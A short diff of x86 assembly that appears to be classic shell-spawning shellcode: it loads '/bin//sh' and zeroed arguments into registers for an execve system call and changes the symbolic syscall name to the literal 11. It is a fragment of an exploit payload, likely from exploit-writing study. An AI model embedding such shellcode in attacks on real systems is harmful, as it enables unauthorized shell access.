@@ -13,5 +13,5 @@ main:
 	mov ebx, esp		; arg1 = "/bin//sh\0"
 	mov ecx, eax		; arg2 = 0
 	mov edx, eax		; arg3 = 0
-	mov al, __NR_execve
+	mov al, 11
 	int 0x80
